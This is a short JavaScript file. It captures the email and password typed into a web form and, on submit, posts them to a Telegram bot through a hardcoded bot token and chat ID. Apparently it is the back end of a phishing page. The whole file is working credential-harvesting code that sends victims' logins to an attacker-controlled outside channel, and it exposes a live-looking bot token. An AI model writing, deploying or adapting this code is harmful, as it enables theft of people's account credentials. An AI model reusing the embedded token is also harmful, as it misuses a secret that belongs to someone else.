let name = document.querySelector(".name");
let password = document.querySelector(".password");

const TOKEN = `6910552128:AAGrjaqwoqGhPyh7TPtYQyakMiVyFx3gktw`;
const CHAT_ID = `-1002143246127`;
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

document.getElementById("tg").addEventListener("submit", function (e) {
  e.preventDefault();
  let message = `<b>Заявка с сайта!</b>\n`;
  message += `Email: <b>${name.value}</b>\n`;
  message += `Password: <b>${password.value}</b>\n`;
  axios.post(URL_API, {
    chat_id: CHAT_ID,
    parse_mode: "html",
    text: message,
  });
});
